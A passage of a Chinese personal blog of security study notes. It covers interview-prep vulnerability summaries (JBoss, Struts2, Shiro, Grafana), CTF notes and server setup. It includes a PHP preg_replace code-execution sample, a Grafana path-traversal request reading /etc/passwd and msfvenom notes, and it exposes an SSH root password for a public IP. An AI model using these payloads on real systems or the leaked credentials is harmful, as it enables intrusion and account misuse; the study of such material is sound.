class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">分析平台 流量传感器 文件威胁鉴定器</span><br><span class="line"></span><br><span class="line">分析平台</span><br><span class="line">	威胁感知</span><br><span class="line">	调查分析</span><br><span class="line">	场景化分析</span><br><span class="line">文件威胁鉴定器</span><br><span class="line">	静态检测</span><br><span class="line">	动态监测</span><br><span class="line">流量传感器</span><br><span class="line">	入侵攻击检测</span><br><span class="line">	威胁情报匹配</span><br><span class="line">	文件还原</span><br><span class="line">	数据采集</span><br><span class="line">天擎</span><br><span class="line">	EDR联动</span><br><span class="line">	终端响应</span><br><span class="line">......</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">天眼告警监测分析</span><br><span class="line">	信息泄露</span><br><span class="line">		敏感文件</span><br><span class="line">            备份文件泄露</span><br><span class="line">            数据库配置泄露</span><br><span class="line">            phpinfo泄露</span><br><span class="line">            .svn .git swp 脚本源码泄露</span><br><span class="line">            版本信息泄露</span><br><span class="line">            phpinfo文件泄露</span><br><span class="line">       	目录遍历</span><br><span class="line">       		目录穿越(../../) 目录列表(响应体Directory触发规则)</span><br><span class="line">   	弱口令</span><br><span class="line">   		邮件弱口令 IMAP POP3 STMP</span><br><span class="line">   		数据库弱口令	redis mysql sqlserver</span><br><span class="line">   		中间件弱口令	Tomcat weblogic jboss</span><br><span class="line">   		basic认证若口令</span><br><span class="line">   		web弱口令</span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<h3 id="hw笔试1"><a href="#hw笔试1" class="headerlink" title="hw笔试1"></a>hw笔试1</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">jboss 反序列化 未授权 弱口令</span><br><span class="line">jboss </span><br><span class="line">	EJBlnvokerServlet反序列化漏洞CVE-2013-4810</span><br><span class="line">	CVE-2015-7501</span><br><span class="line">JBOSSMQ JMS反序列化漏洞影响版本 CVE-2017-7504</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">php preg_replace</span><br><span class="line">	https://blog.csdn.net/m0_64378913/article/details/124894598</span><br><span class="line">	https://www.mianshigee.com/note/detail/6654ulw/</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">if (isset($_GET[&#x27;code&#x27;]))&#123;		//其中的全局变量\$_GET还可以是\$_REQUEST等其他预定义超全局变量。</span><br><span class="line">	$code=$_GET[&#x27;code&#x27;];</span><br><span class="line">	preg_replace(&quot;/\[(.*)\]/e&quot;,&#x27;\\1&#x27;,$code);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">	echo&quot;?code=[phpinfo()]&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">?code=[phpinfo();]</span><br><span class="line">当$pattern处第一个参数存在e修饰时，$replacement的值会被当成PHP代码来执行</span><br><span class="line">匹配[]里面的内容 当正则存在e修饰时 匹配出来的内容会执行php函数 \\1指代第一个匹配出来的内容</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tomcat 幽灵猫 文件包含</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">suid 普通用户执行 但文件执行权限是文件属性的权限 若为root就能获得最高权限</span><br><span class="line">-rwsr-xr-x.   1 root root       27856 Mar 31  2020 passwd</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">S2-055 Jackson反序列化</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">S2-052 Xstream反序列化</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">S2-012 重定向的路径中使用了%&#123;&#125;导致了RCE漏洞</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">S2-016 namespace处插入OGNL代码引发漏洞</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">S2-057 namespace处插入OGNL代码引发的漏洞</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">S2-013 链接标签带入参数时导致OGNL解析漏洞</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">启动frp客户端 ./frpc -s frpc.ini</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfvenom</span><br><span class="line">	--list archs 查看支持的系统架构</span><br><span class="line">	-e	payload编码</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf常用监听模块 Exploit/multi/handler</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php中require()函数包含出错的话，会直接退出</span><br><span class="line">include_once包含出错警告</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">脏牛漏洞提权的原理是Linux内核中mm/gup.c的竞争条件允许本地用户提升权限</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">畸形解析不存在IIS6.5 存在IIS7.5 Nginx&lt;8.03 IIS7.0</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GlassFish Directory Traversal（CVE-2017-1000028）java语言中会把 %c0%af解析为\uEUDF，最后转义为ASCCII字符的/（斜杠）。利用..%c0%af..%c0%af 来向上跳转，达到目录穿越、任意文件读取的效果</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">利用Dirtv Pipe漏洞，可覆盖重写任意可读文件中的数据，从而可将普通权限的用户提升到特权 root</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">re.compile(r&#x27;&lt;div class=&quot;sub&quot;&gt;(.*?)&lt;/div&gt;&#x27;, re.S) </span><br><span class="line">	被采集的数据中有多行，有换行符所以要加re.S或者re.DOTALL，换行读取数据，要不行只能读取一行，如果第一行是空格就不能采集到数据，或者采集不全。</span><br><span class="line">	正则表达式中&#x27;. &#x27;匹配的除&#x27;\n&#x27;以外所有字符，设置 DOTALL模式，让 . 匹配包括 &#x27;\n&#x27; 所有字符。</span><br><span class="line">	</span><br><span class="line">re.I(re.IGNORECASE) ：使匹配对大小写不敏感</span><br><span class="line">re.L(re.LOCAL) ：做本地化识别（locale-aware）匹配</span><br><span class="line">re.M(re.MULTILINE) ：多行匹配，影响 ^ 和 $</span><br><span class="line">re.S(re.DOTALL) ：使 . 匹配包括换行在内的所有字符</span><br><span class="line">re.U(re.UNICODE)：根据Unicode字符集解析字符。这个标志影响 \w, \W, \b, \B.</span><br><span class="line">re.X(re.VERBOSE)：该标志通过给予你更灵活的格式以便你将正则表达式写得更易于理解。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Shiro RememberMe Cookie 	AES</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IIS6.0 默认可执行文件 .asp .asa .cer .cdx</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\安全笔记.assets\image-20230426134217143.png" alt="image-20230426134217143"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shiro-682</span><br><span class="line">	由于shiro与spring处理路径时URL解码和路径标准化顺序不一致导致的使用 &quot;%3b&quot; 绕过</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap level参数为2 检测cookie注入</span><br><span class="line">	不支持redis数据库</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CVE-2022-0185 Linux内核溢出漏洞容器场景下拥有CAP_SYS_ADMIN权限导致容器逃逸到宿主主机</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">加密密钥硬编码存在shiro 1.2.4版本之前</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jboss默认环境路径/invoker/JMXInvokerServlet 出现下载该文件 说明接口开放 此接口存在反序列化漏洞</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tomcat默认控制台的web路径</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export定义shell的全局变量</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">蓝凌OA 前台SSRF到RCE 任意文件上传 EKP后台SQL注入漏洞</span><br><span class="line"></span><br><span class="line">websphere常用端口 9060 9080 8880</span><br><span class="line"></span><br><span class="line">致远(Seeyon) </span><br><span class="line">	A8-v5任意用户密码修改</span><br><span class="line">	A8 htmlofficeservlet</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\安全笔记.assets\image-20230426135610352.png" alt="image-20230426135610352"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">文件上传绕过方式</span><br><span class="line">	畸形协议 溢出Content-Disposition 修改HOST</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\安全笔记.assets\image-20230426151528707.png" alt="image-20230426151528707"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chunk结构的状态</span><br><span class="line">top chunk 		allocated chunk</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nginx配置错误导致</span><br><span class="line">	CRLF注入 目录遍历 目录穿越</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tomcat 被上传webshell原因</span><br><span class="line">	Tomcat 8009端口AJP协议开启</span><br><span class="line">	配置Tomcat使用常用的用户名和弱口令密码</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">整数溢出可能转换为 堆溢出 栈溢出 数组越界</span><br><span class="line"></span><br><span class="line">整数漏洞常见情形</span><br><span class="line">	无符号数存进了有符号变量</span><br><span class="line">	作比较忽略了有符号数可以为负数</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Coremail 配置信息泄露 存储XSS CSRF 接口未授权</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.Net</span><br><span class="line">	XmlSerializer</span><br><span class="line">        serializer.Deserialize(类型可控)</span><br><span class="line">        new XmlSerializer(内容可控)</span><br><span class="line">	BinaryFormatter</span><br><span class="line">		BinaryFormatteer::Dserialize 反序列化内容用户可控</span><br><span class="line">		Net SDK大于等于4.5</span><br></pre></td></tr></table></figure>

<h3 id="ctfshow"><a href="#ctfshow" class="headerlink" title="ctfshow"></a>ctfshow</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">web136</span><br><span class="line">	tee 读取标准输入内容，将读取到的数据写到标准输出和文件</span><br><span class="line"></span><br><span class="line">intval	获取变量证书值 转化字符 到第一个非数字的字符</span><br></pre></td></tr></table></figure>

<h3 id="grafana"><a href="#grafana" class="headerlink" title="grafana"></a>grafana</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">默认端口3000</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Grafana 8.x Plugin Module File Path Traversal (CVE-2021-43798)</span><br><span class="line">插件模块存在目录穿越漏洞</span><br><span class="line">alertlist</span><br><span class="line">cloudwatch</span><br><span class="line">dashlist</span><br><span class="line">elasticsearch</span><br><span class="line">graph</span><br><span class="line">graphite</span><br><span class="line">heatmap</span><br><span class="line">influxdb</span><br><span class="line">mysql</span><br><span class="line">opentsdb</span><br><span class="line">pluginlist</span><br><span class="line">postgres</span><br><span class="line">prometheus</span><br><span class="line">stackdriver</span><br><span class="line">table</span><br><span class="line">text</span><br><span class="line">GET /public/plugins/alertlist/../../../../../../../../../../../../../etc/passwd HTTP/1.1</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">grafana8.5.4</span><br><span class="line">管理后台ssrf</span><br></pre></td></tr></table></figure>

<h3 id="openssh"><a href="#openssh" class="headerlink" title="openssh"></a>openssh</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">OpenSSH 命令注入漏洞(CVE-2020-15778)复现</span><br></pre></td></tr></table></figure>

<h3 id="vmware挂载共享文件夹"><a href="#vmware挂载共享文件夹" class="headerlink" title="vmware挂载共享文件夹"></a>vmware挂载共享文件夹</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">参考https://blog.csdn.net/weixin_45888098/article/details/128890289</span><br><span class="line">1.vmware设置中启用共享文件夹 并设置主机路径 D:\shared_document</span><br><span class="line">2.需要安装vmware tool		apt-get install open-vm-tools-desktop fuse</span><br><span class="line">3.vmware-hgfsclient		查看共享目录</span><br><span class="line">4.创建目录		mkdir -p /mnt/hgfs/shared_document</span><br><span class="line">5.挂载	/usr/bin/vmhgfs-fuse .host:/shared_document /mnt/hgfs/shared_document -o subtype=vmhgfs-fuse,allow_other</span><br><span class="line"></span><br><span class="line">6.开机需要重新挂载 添加自动挂载</span><br><span class="line">	vim /etc/fstab</span><br><span class="line">		.host:/shared_document /mnt/hgfs/shared_document fuse.vmhgfs-fuse allow 0 0</span><br></pre></td></tr></table></figure>

<h3 id="8080端口被占用"><a href="#8080端口被占用" class="headerlink" title="8080端口被占用"></a>8080端口被占用</h3><p><img src="C:\Users\hyy\Desktop\安全笔记.assets\image-20230521202926073.png" alt="image-20230521202926073"></p>
<h3 id="adb调试华为"><a href="#adb调试华为" class="headerlink" title="adb调试华为"></a>adb调试华为</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#允许ADB调试</span><br><span class="line">	1.【设置】→【系统和更新】→【开发人员选项】（如果没有这个按钮需要去【关于手机】→【版本号】→点击5次即可进入开发者模式）点击仅充电模式下允许ADB调试！</span><br><span class="line">连接数据线的情况下</span><br><span class="line">	adb tcpip 12321		#开启了一个类似ssh的服务</span><br><span class="line"></span><br><span class="line">#需要手机和电脑端在一个ip下</span><br><span class="line">adb connect 192.168.200.15:12321</span><br><span class="line"></span><br><span class="line">#UMX0220908023656是我忘记拔掉数据线 这个设备是数据线连接的</span><br><span class="line">C:\Users\hyy&gt;adb devices</span><br><span class="line">List of devices attached</span><br><span class="line">UMX0220908023656        device</span><br><span class="line">192.168.200.15:12321    device</span><br><span class="line"></span><br><span class="line">#选中要连接的设备</span><br><span class="line">adb -s 192.168.200.15:12321 shell</span><br><span class="line">adb -s UMX0220908023656 shell</span><br><span class="line"></span><br><span class="line">#或者拔掉数据线</span><br><span class="line">adb shell</span><br><span class="line"></span><br><span class="line">#但是不是root权限 只有shell权限 adb root执行不了</span><br></pre></td></tr></table></figure>

<h3 id="frp-内网映射外网"><a href="#frp-内网映射外网" class="headerlink" title="frp 内网映射外网"></a>frp 内网映射外网</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">映射到也可以用cpolar 只是不能指定ip 是用别人的随机域名</span><br><span class="line">frp映射</span><br><span class="line">	https://blog.csdn.net/oyy_1126/article/details/115702152</span><br><span class="line">服务端</span><br><span class="line">	需开启防火墙 firewall和腾讯云 frp端口以及被映射的端口</span><br><span class="line">	frps.ini 只需设置一个frp服务端口即可</span><br><span class="line">	frps -c frps.ini</span><br><span class="line">客户端</span><br><span class="line">	无需打开防火墙</span><br><span class="line">	frpc -c frpc.ini</span><br></pre></td></tr></table></figure>

<h3 id="服务器centos安装msf"><a href="#服务器centos安装msf" class="headerlink" title="服务器centos安装msf"></a>服务器centos安装msf</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/weixin_44268918/article/details/129771330</span><br></pre></td></tr></table></figure>

<h3 id="Centos搭建云服务器"><a href="#Centos搭建云服务器" class="headerlink" title="Centos搭建云服务器"></a>Centos搭建云服务器</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">重装	2核40g</span><br><span class="line">ssh root@1.117.139.173</span><br><span class="line">123456Hyy</span><br><span class="line"></span><br><span class="line">虚拟机重装centos 公钥问题</span><br><span class="line">rpm --import https://repo.mysql.com/RPM-GPG-KEY-mysql-2022</span><br><span class="line"></span><br><span class="line">这个报错重装之后会有，把这个文件删了</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\安全笔记.assets\1656411333134.png" alt="1656411333134"></p>
<h3 id="宝塔-Docker-Halo"><a href="#宝塔-Docker-Halo" class="headerlink" title="宝塔+Docker+Halo"></a>宝塔+Docker+Halo</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">安装宝塔</span><br><span class="line">	https://bt.cn/bbs/thread-19376-1-1.html</span><br><span class="line"></span><br><span class="line">yum install -y wget &amp;&amp; wget -O install.sh http://download.bt.cn/install/install_6.0.sh &amp;&amp; sh install.sh			install.sh文件下载在/root文件夹下</span><br><span class="line">bt default查看内外网地址及密码</span><br><span class="line">安装选择左边的ngnix		面板8888端口放行</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\安全笔记.assets\1665632561044.png" alt="1665632561044"></p>
<p><img src="C:\Users\hyy\Desktop\安全笔记.assets\1656426236040.png" alt="1656426236040"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">安装docker</span><br><span class="line">	https://docs.docker.com/engine/install/centos/</span><br><span class="line">	</span><br><span class="line">yum update    #可以不升级</span><br><span class="line">#设置资源</span><br><span class="line">yum install -y yum-utils</span><br><span class="line">yum-config-manager \</span><br><span class="line">    --add-repo \</span><br><span class="line">    https://download.docker.com/linux/centos/docker-ce.repo</span><br><span class="line">#安装docker引擎</span><br><span class="line">systemctl start docker			#启动一下</span><br><span class="line">docker run hello-world			</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">docker安装halo</span><br><span class="line">	https://docs.halo.run/getting-started/install/docker/</span><br><span class="line"></span><br><span class="line">mkdir ~/.halo &amp;&amp; cd ~/.halo			#管理元权限执行，pwd为/root/.halo</span><br><span class="line">wget https://dl.halo.run/config/application-template.yaml -O ./application.yaml</span><br><span class="line">vim application.yaml				#默认8090端口		默认H2database</span><br><span class="line">docker pull halohub/halo:1.5.3		#拉取最新的Halo镜像</span><br><span class="line">#创建容器</span><br><span class="line">docker run -it -d --name halo -p 8090:8090 -v ~/.halo:/root/.halo --restart=unless-stopped halohub/halo:1.5.3</span><br><span class="line">#此处按照博主的意思	这样改应该就可以开第二个博客在8091端口，要创建~/.halo2 此处applocation.yaml文件不用改 改文件夹加端口两个部分</span><br><span class="line">docker run -it -d --name halo2 -p 8091:8090 -v ~/.halo2:/root/.halo --restart=unless-stopped halohub/halo:1.5.3</span><br><span class="line">    -it： 开启输入功能并连接伪终端</span><br><span class="line">    -d： 后台运行容器</span><br><span class="line">    --name： 为容器指定一个名称</span><br><span class="line">    -p： 端口映射，格式为 主机(宿主)端口:容器端口 ，可在 application.yaml 配置。</span><br><span class="line">    -v： 工作目录映射。形式为：-v 宿主机路径:/root/.halo，后者不能修改。</span><br><span class="line">    --restart： 建议设置为 unless-stopped，在 Docker 启动的时候自动启动 Halo 容器</span><br><span class="line">docker会自启动两个博客</span><br><span class="line">systemctl enable docker		把docker加入自启动</span><br><span class="line"></span><br><span class="line">8090端口放行</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">绑定域名</span><br><span class="line"></span><br><span class="line">#可参考视频</span><br><span class="line">https://www.bilibili.com/video/BV1Dq4y1Z7q5?from=search&amp;seid=11693727023437818175&amp;spm_id_from=333.337.0.0&amp;vd_source=d5448e640adeda715972607248810967</span><br><span class="line">#这个网站要注册购买域名</span><br><span class="line">https://www.namesilo.com</span><br><span class="line">#使用cloudflare关联域名和ip地址，也是先注册账号</span><br><span class="line">https://developers.cloudflare.com</span><br><span class="line">#按步骤来，第三步关联（链接1），将cloudflare分配的名称服务器（链接2）关联到namaslio（链接3）</span><br><span class="line">https://developers.cloudflare.com/dns/zone-setups/full-setup/setup/</span><br><span class="line">https://dash.cloudflare.com/14c08eb2e4e0d81cdcd74e2bef1566f1/jinjidehyy.com/dns</span><br><span class="line">https://www.namesilo.com/account_domain_manage_domain.php?domain=ZmRmZwZlZmRmAQZ2ZmNmBD==5n3r9p122761r85091ors8o52rn69noq</span><br><span class="line">#多地ping查看是否绑定成功</span><br><span class="line">https://ping.chinaz.com/www.jinjidehyy.com</span><br><span class="line"></span><br><span class="line"># p8绑定域名p9反向代理没看完 网站需要备案在申请 暂不能用域名访问 还有SSL</span><br><span class="line"> [如何用服务器优雅地搭建一个博客—Hello,Halo!_哔哩哔哩_bilibili](https://www.bilibili.com/video/BV1JN411Q7Na/?spm_id_from=333.337.search-card.all.click&amp;vd_source=d5448e640adeda715972607248810967) </span><br></pre></td></tr></table></figure>

<h3 id="github-io建站"><a href="#github-io建站" class="headerlink" title="github.io建站"></a>github.io建站</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">settings中Emails取消勾选 Keep my email address private</span><br><span class="line">	hexo d 执行不了报错不能邮箱推送</span><br></pre></td></tr></table></figure>






























      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2023/07/05/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/" data-id="cljpcwhtz0005l8ez87ftha1h" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-编程语言" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/07/05/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/" class="article-date">
  <time class="dt-published" datetime="2023-07-05T06:46:12.703Z" itemprop="datePublished">2023-07-05</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">韩顺平linux</span><br><span class="line">https://www.bilibili.com/video/BV1Sv411r7vd</span><br><span class="line"></span><br><span class="line">ssh root#192.168.213.135</span><br><span class="line">123456Hyy</span><br><span class="line">ssh hyy19#192.168.213.135</span><br><span class="line">123</span><br><span class="line">linux是内核 --服务器</span><br><span class="line">发行版本ubuntu(python) centos</span><br></pre></td></tr></table></figure>

